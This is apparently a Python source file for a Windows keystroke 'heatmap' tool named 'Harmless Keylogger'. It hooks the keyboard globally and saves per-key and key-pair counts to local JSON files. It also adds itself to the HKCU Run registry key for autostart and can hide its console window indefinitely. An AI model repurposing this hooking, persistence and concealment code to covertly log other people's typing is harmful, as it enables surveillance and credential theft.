import keyboard
from keyboard import KeyboardEvent
import win32api
import win32event
import win32console
import win32gui
import win32con
import winerror
import json
import os
from os.path import exists, join
import sys
from datetime import date
import time
from threading import Timer
from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
from KeyloggerConfig import KeyloggerConfig

# Folder where the pages of your book get logged
BOOK_PATH = 'myBook'
# Config File
CONFIG_FILE = 'keylogger.config.json'
# Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
LOGGER_NAME = "Harmless Keylogger"
# File path
CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
# Directory path
DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))

# Config object
config = {}
# Buffer for Heatmap
heatmap_buffer = {}
heatmap_order = []
# Paused logging
paused = False
# Time when the last save of the heatmap was
last_save = 0
# State of visibility
visible = True

# Add to startup for persistence
def add_to_startup():
    global visible
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    reg_value = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' ' + '"' + CURRENT_FILE_PATH + '"'

    try:
        SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
        if visible:
            print("Keylogger applied to startup.")
    except Exception as e:
        if visible:
            print("Error occurred while applying keylogger to startup:")
            print(e)

# Remove from startup 
def remove_from_startup():
    global visible
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)

    try:
        DeleteValue(key2change, LOGGER_NAME)  
        if visible:
            print("Keylogger removed from startup.")
    except Exception as e:
        if visible:
            print("No keylogger is applied to startup.")

# Debug logger
def log_debug():
    global config, heatmap_buffer
    if not config.get_hide() == "allways":
        if len(heatmap_order) > 0:
                # Print the last pressed key to console
                if len(heatmap_order[-1]["key"]) == 1:
                    print(heatmap_buffer[heatmap_order[-1]["key"][0]])
                    return True
                # Print the last pressed keycombinaiton to console
                elif len(heatmap_order[-1]["key"]) == 2:
                    print(heatmap_buffer[heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1]])
                    return True
    return False

# Append file with pressed keys
def log_local():
    global config, heatmap_buffer 
    # Remove elements with mentions = 0     
    unused = []
    for k,v in heatmap_buffer.items():
        if v["mentions"] == 0:
            unused.append(k)
    for k in unused:
        del heatmap_buffer[k]
    # Sort elements by mentions
    sorted_buffer = sorted(heatmap_buffer.items(), key=lambda x:x[1]["mentions"], reverse=True)
    heatmap_buffer = dict(sorted_buffer)
    # Save in file
    path = join(DIR_PATH, os.pardir, BOOK_PATH)
    if not exists(path):
        os.makedirs(path) 
    file = join(path, (("" if config.get_file_prefix() == "" else config.get_file_prefix() + "_") + date.today().strftime('%Y-%m-%d') + ".heatmap" + ".json"))
    with open(file, "w") as write_file:
        json.dump(heatmap_buffer, write_file, indent=4)
    return True

# Log with configured output
def log_it():
    global config, last_save
    if config.get_output() == "local":   
        if round(time.time_ns() / 1000000) - last_save > config.get_save_intervall():
            last_save = round(time.time_ns() / 1000000)
            return log_local()
    elif config.get_output() == "debug":
        return log_debug()
    return False
    
def key_callback(event: KeyboardEvent):
    global heatmap_buffer, heatmap_order, paused

    # while paused no logging
    if paused:
        return False
    
    # event key up 
    if event.event_type == 'up':
        return False
    
    # Current time when key is pressed
    now_ms = round(event.time * 1000)

    # Remove pressed keys there are to old to delete
    if not config.get_processing_time() == -1:
        to_old = []
        for e in heatmap_order:
            if now_ms - e["time"] > config.get_processing_time():
                to_old.append(e)
        for k in to_old:
            heatmap_order.remove(k)
    
    # Console output
    if config.get_output() == 'console':
        print("event:",{
            "name": event.name,
            "event_type": event.event_type,
            "scan_code": event.scan_code,
            "time": event.time,
            "device": event.device,
            "is_keypad": event.is_keypad,
            "modifiers": event.modifiers
        })
        return True
    
    key_pressed = {}
    # Key Represention
    # Shift
    if event.scan_code == 42 or event.scan_code == 54:
        return False
    # Space
    elif event.name == 'space':
        key_pressed = {
            "name": event.name,
            "scancode": event.scan_code,
            "value": " ",
            "length": 1
        }
    # Enter
    elif event.name == 'enter':
        key_pressed = {
            "name": event.name,
            "scancode": event.scan_code,
            "value": "\n",
            "length": 1
        }
    # Backspace
    elif event.name == 'backspace':
        if config.get_exclude_typos():
            if len(heatmap_order) > 0:
                if len(heatmap_order[-1]["key"]) == 1:
                    heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] - 1
                elif len(heatmap_order[-1]["key"]) == 2:
                    heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] - 1
                    heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] = heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] - 1
                heatmap_order.pop()
    # Letters
    elif len(event.name) == 1:
        key_pressed = {
        "name": event.name,
        "scancode": event.scan_code,
        "value": event.name,
        "length": 1
        }
    # Other
    else:
        print("Not saved key: ")
        print(event.name, event.scan_code)
    
    if not key_pressed == {}:
        index = [key_pressed["name"]]
        # Add combination key to heatmap
        if len(heatmap_order) > 0 and now_ms - heatmap_order[-1]["time"] < config.get_combination_time():
            if len(heatmap_order[-1]["key"]) == 1:
                temp = {}
                temp["name"] = [heatmap_buffer[heatmap_order[-1]["key"][0]]["name"], key_pressed["name"]]
                temp["scancode"] = [heatmap_buffer[heatmap_order[-1]["key"][0]]["scancode"], key_pressed["scancode"]]
                temp["value"] = [heatmap_buffer[heatmap_order[-1]["key"][0]]["value"], key_pressed["value"]]
                temp["length"] = 2
                index = [temp["name"][0], temp["name"][1]]
            elif len(heatmap_order[-1]["key"]) == 2:
                temp = {}
                temp["name"] = [heatmap_buffer[heatmap_order[-1]["key"][-1]]["name"], key_pressed["name"]]
                temp["scancode"] = [heatmap_buffer[heatmap_order[-1]["key"][-1]]["scancode"], key_pressed["scancode"]]
                temp["value"] = [heatmap_buffer[heatmap_order[-1]["key"][-1]]["value"], key_pressed["value"]]
                temp["length"] = 2
                index = [temp["name"][0], temp["name"][1]]
            if (temp["name"][0] + temp["name"][1]) in heatmap_buffer and "mentions" in heatmap_buffer[(temp["name"][0] + temp["name"][1])]:
                heatmap_buffer[(temp["name"][0] + temp["name"][1])]["mentions"] = heatmap_buffer[(temp["name"][0] + temp["name"][1])]["mentions"] + 1
            else:
                temp["mentions"] = 1
                heatmap_buffer[(temp["name"][0] + temp["name"][1])] = temp
        # Add single key to heatmap
        if key_pressed["name"] in heatmap_buffer and "mentions" in heatmap_buffer[key_pressed["name"]]:
            heatmap_buffer[key_pressed["name"]]["mentions"] = heatmap_buffer[key_pressed["name"]]["mentions"] + 1
        else:
            key_pressed["mentions"] = 1
            heatmap_buffer[key_pressed["name"]] = key_pressed

        heatmap_order.append({
            "key": index,
            "time": now_ms
        })
    
    return log_it()

def pause_logging():
    global paused, visible
    if visible:
        print(LOGGER_NAME + (" paused" if not paused else " continue"))
    paused = not paused

def read_heatmap():
    path = join(DIR_PATH, os.pardir, BOOK_PATH)
    file = join(path, (("" if config.get_file_prefix() == "" else config.get_file_prefix() + "_") + date.today().strftime('%Y-%m-%d') + ".heatmap" + ".json"))
    if exists(file) and not os.stat(file).st_size == 0:
        with open(file, "r") as read_file:
            global heatmap_buffer
            heatmap_buffer = json.load(read_file)
            return True
    return False    

def hide():
    global visible
    if config.get_hide() == "never":
        print("Change visibillity is with this config not allowed!")
    elif visible: 
        # Hide Console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
        visible = False
        return True
    elif not config.get_hide() == "allways":
        # Unhide Console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_NORMAL)
        visible = True
        return True
    return False


def main():
    global visible
    if visible:
        print(LOGGER_NAME + " started")
    # Hide comand prompt
    if config.get_hide() == "ready":
        timer = Timer(5, hide)
        timer.start()
    keyboard.hook(key_callback)
    # To Pause the Keylogger (ctrl + alt + p)
    keyboard.add_hotkey(config.get_pause_hotkey(), pause_logging)
    # To save the buffer (ctrl + alt + s)
    keyboard.add_hotkey(config.get_save_hotkey(), log_local)
    # To toggle visibillity of window (ctrl + alt + v)
    keyboard.add_hotkey(config.get_visible_hotkey(), hide)
    # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
    keyboard.wait(config.get_exit_hotkey()) 
    if config.get_output() == "local":
        if not log_local() and visible:
            print("Something went wrong while saving!")
    if visible:
        print(LOGGER_NAME + " stopped.")
    exit()

if __name__ == '__main__':
    # Read the configurarion
    config = KeyloggerConfig()
    config.read_config(join(DIR_PATH, CONFIG_FILE)) 
    if visible:
        print("Successfully load configuration.")

    # Hide comand prompt
    if config.get_hide() == "allways" or config.get_hide() == "instant":
        hide()

    # Disallowing multiple instances with same prefix
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + config.get_file_prefix())
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        if visible:
            print("Multiple instances are not allowed")
        exit(0)

    # Add to startup
    if config.get_auto_start():
        add_to_startup()
    else: 
        remove_from_startup()

    # Read already saved values 
    if read_heatmap():
        if visible:
            print("Loaded existing heatmap.")
    else:
        if visible:
            print("No Heatmap for today exist. Will be created.")

    # Setup save time
    last_save = round(time.time_ns() / 1000000)

    main()
